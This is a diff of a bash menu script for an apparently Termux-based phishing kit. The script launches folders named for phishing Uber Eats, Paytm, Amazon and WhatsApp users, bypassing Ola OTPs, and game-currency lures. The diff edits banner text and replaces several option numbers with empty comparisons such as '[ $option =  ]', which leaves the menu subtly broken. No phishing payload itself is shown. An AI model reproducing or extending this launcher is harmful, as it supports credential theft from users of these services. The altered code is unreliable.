@@ -235,15 +235,15 @@ echo
 banner(){
 echo -e "\e[1;96m==================================================================\e[m "
 echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFree-UC-Buy-OH\e[0m"
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFree UC Buy OH\e[0m"
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mLucky-Spin-OH\e[0m"
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mLucky Spin OH\e[0m"
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mBonusChallenge-Free-Gift-OH\e[0m"
+printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mBonusChallenge Free Gift OH\e[0m"
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
@@ -392,7 +392,7 @@ ash1() {
 			   
                            break;
 			   
-	elif [ $option = 04 ] || [ $option = 4 ]
+	elif [ $option = 04 ] || [ $option =  ]
         then
                           cd /data/data/com.termux/files/usr/bin/phs
 			  cd UberEats-Phishing/
@@ -424,7 +424,7 @@ ash1() {
 
                           break;
 			  
-        elif [ $option = 05 ] || [ $option = 5 ]
+        elif [ $option = 05 ] || [ $option =  ]
         then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd ola-otpbypass/
@@ -488,7 +488,7 @@ ash1() {
   
                           break;
 			  
-       elif [ $option = 07 ] || [ $option = 7 ]
+       elif [ $option = 07 ] || [ $option =  ]
        then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Paytm-Phishing/
@@ -559,7 +559,7 @@ ash1() {
                                 
 				break;
 				
-        elif [ $option = 08 ] || [ $option = 8 ]
+        elif [ $option = 08 ] || [ $option =  ]
 	then
 
                           cd /data/data/com.termux/files/usr/bin/phs
@@ -592,7 +592,7 @@ ash1() {
 
                           break;
 
-           elif [ $option = 09 ] || [ $option = 9 ]
+           elif [ $option = 09 ] || [ $option =  ]
 	   then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd instafollow/
@@ -624,7 +624,7 @@ ash1() {
 
                            break;
 			   
-               elif [ $option = 10 ]
+               elif [ $option =  ]
 	       then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd amazonsign/
@@ -656,7 +656,7 @@ ash1() {
 
                            break;
 
-                  elif [ $option = 11 ]
+                  elif [ $option =  ]
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd whatsapp-phishing/
